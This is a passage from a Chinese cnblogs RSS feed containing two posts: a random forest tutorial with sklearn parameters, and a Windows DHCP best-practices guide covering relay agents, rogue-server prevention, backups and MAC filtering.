&lt;p&gt;&lt;span&gt;随机森林是一个包含多个决策树的分类器，并且其输出的类别是由个别树输出的类别的众数而定。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;例如, 如果你训练了5个树, 其中有4个树的结果是True, 1个数的结果是False, 那么最终投票结果就是True&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&quot;3、-随机森林原理过程&quot;&gt;&lt;span&gt;随机森林原理过程&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;学习算法根据下列算法而建造每棵树：&lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;用N来表示训练用例（样本）的个数，M表示特征数目。采取bootstrap抽样&lt;/span&gt;
&lt;ul&gt;&lt;li&gt;1、一次随机选出一个样本，重复N次， （有可能出现重复的样本）&lt;/li&gt;
&lt;li&gt;2、随机去选出m个特征, m &amp;lt;&amp;lt;M，建立决策树&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;31-为什么采用bootstrap抽样&quot;&gt;&lt;span&gt;为什么采用BootStrap抽样&lt;/span&gt;&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;为什么要随机抽样训练集？　　&lt;/span&gt;
&lt;ul&gt;&lt;li&gt;如果不进行随机抽样，每棵树的训练集都一样，那么最终训练出的树分类结果也是完全一样的&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;为什么要有放回地抽样？&lt;/span&gt;
&lt;ul&gt;&lt;li&gt;如果不是有放回的抽样，那么每棵树的训练样本都是不同的，都是没有交集的，这样每棵树都是“有偏的”，都是绝对“片面的”（当然这样说可能不对），也就是说每棵树训练出来都是有很大的差异的；而随机森林最后分类取决于多棵树（弱分类器）的投票表决。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;32-api&quot;&gt;&lt;span&gt;API&lt;/span&gt;&lt;/h2&gt;
&lt;ul readability=&quot;1&quot;&gt;&lt;li readability=&quot;5&quot;&gt;
&lt;p&gt;class sklearn.ensemble.RandomForestClassifier(n_estimators=10, criterion=’gini’, max_depth=None, bootstrap=True, random_state=None, min_samples_split=2)&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;随机森林分类器&lt;/li&gt;
&lt;li&gt;n_estimators：integer，optional（default = 10）森林里的树木数量120,200,300,500,800,1200&lt;/li&gt;
&lt;li&gt;criteria：string，可选（default =“gini”）分割特征的测量方法&lt;/li&gt;
&lt;li&gt;max_depth：integer或None，可选（默认=无）树的最大深度 5,8,15,25,30&lt;/li&gt;
&lt;li&gt;max_features=&quot;auto”,每个决策树的最大特征数量
&lt;ul&gt;&lt;li&gt;If &quot;auto&quot;, then &lt;code&gt;max_features=sqrt(n_features)&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;If &quot;sqrt&quot;, then &lt;code&gt;max_features=sqrt(n_features)&lt;/code&gt; (same as &quot;auto&quot;).&lt;/li&gt;
&lt;li&gt;If &quot;log2&quot;, then &lt;code&gt;max_features=log2(n_features)&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;If None, then &lt;code&gt;max_features=n_features&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;bootstrap：boolean，optional（default = True）是否在构建树时使用放回抽样&lt;/li&gt;
&lt;li&gt;min_samples_split:节点划分最少样本数&lt;/li&gt;
&lt;li&gt;min_samples_leaf:叶子节点的最小样本数&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;ul&gt;&lt;li&gt;&lt;span&gt;超参数：n_estimator, max_depth, min_samples_split,min_samples_leaf&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h2&gt;&lt;span&gt;案例&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;还是刚刚的泰坦尼克号，用随机森林进行预测&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1717524/202101/1717524-20210119220400026-260883809.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;结果为：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1717524/202101/1717524-20210119220419592-995384081.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

&lt;h2 id=&quot;4、总结&quot;&gt;&lt;span&gt;总结&lt;/span&gt;&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;在当前所有算法中，具有极好的准确率&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;能够有效地运行在大数据集上，处理具有高维特征的输入样本，而且不需要降维&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;能够评估各个特征在分类问题上的重要性&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1717524/202101/1717524-20210119220813387-453313156.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/1717524/202101/1717524-20210119221004519-2110761418.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
</description>
<pubDate>Tue, 19 Jan 2021 14:10:00 +0000</pubDate>
<dc:creator>清风紫雪</dc:creator>
<og:description>朴素贝叶斯算法 朴素 假定特征与特征之间是相互独立的 贝叶斯公式 公式分为三个部分： P(C)：每个文档类别的概率(某文档类别数／总文档数量) P(W│C)：给定类别下特征（被预测文档中出现的词）的概</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/xiaofengzai/p/14300408.html</dc:identifier>
</item>
<item>
<title>Windows DHCP最佳实践（四） - Bigyoungs</title>
<link>http://www.cnblogs.com/bigyoung/p/14300398.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/bigyoung/p/14300398.html</guid>
<description>&lt;p&gt;这是Windows DHCP最佳实践和技巧的最终指南。&lt;/p&gt;
&lt;p&gt;如果您有任何最佳做法或技巧，请在下面的评论中发布它们。&lt;/p&gt;
&lt;p&gt;在本指南（四）中，我将分享以下&lt;strong&gt;DHCP最佳实践和技巧&lt;/strong&gt;。&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;&lt;a href=&quot;http://bigyoung.cn&quot; target=&quot;_blank&quot;&gt;使用DHCP中继代理&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://bigyoung.cn&quot; target=&quot;_blank&quot;&gt;防止恶意DHCP服务器&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://bigyoung.cn&quot; target=&quot;_blank&quot;&gt;备用DHCP服务器&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://bigyoung.cn&quot; target=&quot;_blank&quot;&gt;DHCP MAC地址过滤&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://bigyoung.cn&quot; target=&quot;_blank&quot;&gt;结论&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;h2 id=&quot;dhcp中继代理&quot;&gt;DHCP中继代理&lt;/h2&gt;
&lt;p&gt;如果您有一个具有多个网络的集中式DHCP服务器，则需要使用DHCP中继代理。&lt;/p&gt;
&lt;p&gt;广播DHCP消息，路由器不转发广播数据包。要解决此问题，您可以在路由器/交换机上启用DHCP中继代理功能，以允许DHCP广播数据包到达设备。&lt;/p&gt;
&lt;p&gt;您将需要查看路由器文档，以获取启用中继代理的命令。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;资料来源&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/ipaddr_dhcp/configuration/15-sy/dhcp-15-sy-book/dhcp-relay-agent.html&quot; target=&quot;_blank&quot;&gt;思科配置DHCP中继代理&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://techhub.hpe.com/eginfolib/networking/docs/switches/RA/15-18/5998-8165_ra_2620_mrg/content/ch03s09.html&quot; target=&quot;_blank&quot;&gt;HP配置DHCP中继&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;防止恶意dhcp服务器&quot;&gt;防止恶意DHCP服务器&lt;/h2&gt;
&lt;p&gt;您是否曾经有用户或IT部门中的某人将交换机/路由器插入墙上的可用端口？然后，导致用户无法连接到Internet或其他资源，Helpdesk电话开始爆炸？&lt;/p&gt;
&lt;p&gt;流氓DHCP服务器令人头疼。此外，它们可能会带来安全隐患，并且会被用于各种攻击。&lt;/p&gt;
&lt;p&gt;阻止恶意DHCP服务器的最佳方法是在网络交换机上，可以通过称为DHCP侦听或基于802.1x端口的网络访问选项来完成。&lt;/p&gt;
&lt;h3 id=&quot;dhcp监听&quot;&gt;DHCP监听&lt;/h3&gt;
&lt;p&gt;DHCP侦听是第2层交换功能，可阻止未经授权的（恶意）DHCP服务器向设备分配IP地址。&lt;/p&gt;
&lt;p&gt;DHCP通过将交换端口分类为受信任或不受信任的端口来工作。可信端口允许DHCP消息，非可信端口阻止DHCP消息。&lt;/p&gt;
&lt;p&gt;您希望设备（计算机，打印机，电话）位于不受信任的端口上，以便无法插入恶意DHCP服务器。&lt;/p&gt;
&lt;h3 id=&quot;基于8021x端口的网络访问&quot;&gt;基于802.1x端口的网络访问&lt;/h3&gt;
&lt;p&gt;802.1x是用于基于端口的网络访问控制的IEEE标准。它是一种机制，要求设备在提供网络访问权限之前先进行身份验证。&lt;/p&gt;
&lt;p&gt;这不仅对流氓DHCP服务器有利，而且对控制对任何设备的网络访问也有好处。&lt;/p&gt;
&lt;p&gt;802.1x通常在交换机级别配置，并且需要客户端和身份验证服务器。&lt;/p&gt;
&lt;h2 id=&quot;备用dhcp服务器&quot;&gt;备用DHCP服务器&lt;/h2&gt;
&lt;p&gt;DHCP服务器对于向客户端提供IP设置至关重要。如果系统崩溃，则需要尽快恢复该服务器。&lt;/p&gt;
&lt;p&gt;您是否知道默认情况下，Windows将每60分钟将DHCP配置备份到此文件夹&lt;code&gt;%SystemRoot%System32\DHCP\backup&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;但是如果服务器崩溃并且您无法访问该文件夹，那对您没有好处。&lt;/p&gt;
&lt;p&gt;如果没有任何异地备份，则需要定期将备份文件夹复制到另一个位置。&lt;/p&gt;
&lt;p&gt;这可以通过将文件夹复制到另一个位置或使用PowerShell指定远程位置的脚本来完成。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Backup-DhcpServer -ComputerName “DC01” -Path “C:\DHCPBackup”&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;您可以在我的文章“&lt;a href=&quot;https://www.bigyoung.cn/posts/173/&quot; target=&quot;_blank&quot;&gt;备份和还原Windows DHCP服务器”中了解更多信息。&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;dhcp-mac地址过滤&quot;&gt;DHCP MAC地址过滤&lt;/h2&gt;
&lt;p&gt;DHCP MAC地址过滤功能使您可以基于MAC地址来阻止或允许IP地址分配。&lt;/p&gt;
&lt;p&gt;如果要让DHCP作用域为明确的设备列表提供IP地址，这将很有用。如果VLAN上有不需要的设备获取IP地址，这也很有用。&lt;/p&gt;
&lt;p&gt;例如，您有用户将BYOD设备放在您的安全VLAN上。您可以将这些设备添加到拒绝过滤器中。DHCP MAC过滤是一种控制网络访问的快速简便的方法。如果有时间和资源，最好的选择是使用802.1x。&lt;/p&gt;
&lt;h3 id=&quot;结论&quot;&gt;结论&lt;/h3&gt;
&lt;p&gt;在管理DHCP服务器时，我多年来一直在使用这些技巧。如果能够正确配置，并且正确设置了DHCP服务器，这几乎不会出现问题。我希望这些技巧有用，请在下面的评论中发布您拥有的任何DHCP技巧或最佳实践。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.bigyoung.cn/posts/174/&quot; target=&quot;_blank&quot;&gt;DHCP最佳实践（一）&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.bigyoung.cn/posts/175/&quot; target=&quot;_blank&quot;&gt;DHCP最佳实践（二）&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.bigyoung.cn/posts/176/&quot; target=&quot;_blank&quot;&gt;DHCP最佳实践（三）&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/bigyoung/p/14300398.html#&quot;&gt;DHCP最佳实践（四）&lt;/a&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;2.5862068965517&quot;&gt;
&lt;p&gt;本文首发于&lt;a href=&quot;http://bigyoung.cn&quot; target=&quot;_blank&quot;&gt;BigYoung小站&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</description>
<pubDate>Tue, 19 Jan 2021 14:06:00 +0000</pubDate>
<dc:creator>Bigyoungs</dc:creator>
<og:description>这是Windows DHCP最佳实践和技巧的最终指南。 如果您有任何最佳做法或技巧，请在下面的评论中发布它们。 在本指南（四）中，我将分享以下DHCP最佳实践和技巧。 使用DHCP中继代理 防止恶意D</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/bigyoung/p/14300398.html</dc:identifier>
</item>
</channel>
</rss>